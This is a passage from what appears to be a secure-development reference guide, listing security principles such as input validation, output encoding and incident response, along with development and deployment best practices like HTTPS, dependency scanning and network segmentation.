3. **Fail Securely**: Ensure failures don't compromise security
4. **Input Validation**: Validate all user input (whitelist approach)
5. **Output Encoding**: Encode output based on context
6. **Security by Design**: Build security into development process
7. **Regular Updates**: Keep all software and dependencies updated
8. **Security Testing**: Regular penetration testing and code reviews
9. **Monitoring and Logging**: Implement comprehensive logging and monitoring
10. **Incident Response**: Have a plan for security incidents

### Development Best Practices

- Use security frameworks and libraries
- Follow secure coding guidelines
- Implement automated security testing
- Regular dependency scanning
- Code reviews with security focus
- Security training for developers
- Use static and dynamic analysis tools
- Implement CI/CD security gates

### Deployment Best Practices

- Use HTTPS everywhere
- Implement security headers
- Regular security patches
- Network segmentation
- Firewall configuration
- Intrusion detection systems
- Regular backups
- Disaster recovery planning

---

**Document Version:** 1.0  
**Last Updated:** December 1, 2025  
**Classification:** Security Reference Guide

